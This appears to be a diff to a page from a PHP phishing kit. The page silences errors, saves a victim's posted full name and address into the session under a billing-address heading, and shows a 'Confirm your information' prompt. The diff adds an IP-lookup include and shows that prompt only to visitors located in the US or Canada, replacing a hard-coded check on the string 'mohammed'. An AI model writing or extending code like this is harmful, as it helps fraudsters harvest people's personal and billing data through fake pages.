@@ -5,6 +5,7 @@ date_default_timezone_set('GMT');
 error_reporting(0); 
 ################### SECOND FILES #####################
 include('../../functions/get_lang_en.php');
+include('../../functions/get_ip.php');
 ############## BILL ADDRESS INFORMATION ##############
 $_SESSION['_fullname_']    = $_POST['fullname'];
 $_SESSION['_address_']     = $_POST['address'];
@@ -150,7 +151,7 @@ exit;
 												
 												
 												<?
-												if($mo == 'mohammed'){
+												if($_SESSION['_LOOKUP_CNTRCODE_'] == 'US' OR $_SESSION['_LOOKUP_CNTRCODE_'] == 'CA'){
 													
 													echo'<p style="margin-bottom: 8px;">Confirm your information</p>
 												
